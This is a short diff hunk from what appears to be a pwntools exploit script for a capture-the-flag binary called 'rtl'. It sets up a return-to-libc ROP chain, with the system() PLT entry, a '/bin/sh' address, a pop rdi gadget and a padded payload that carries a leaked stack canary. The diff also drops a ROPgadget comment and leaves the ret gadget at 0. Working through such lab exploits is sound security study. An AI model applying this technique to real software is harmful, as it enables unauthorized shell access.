@@ -113,7 +113,7 @@ slog('canary', cnry)
 system_plt = e.plt['system']
 binsh = 0x400874
 pop_rdi = 0x0000000000400596
-ret = 0 # ROPgadget --binary=./rtl | grep ": ret"
+ret = 0 
 
 payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
 payload += p64(ret)  
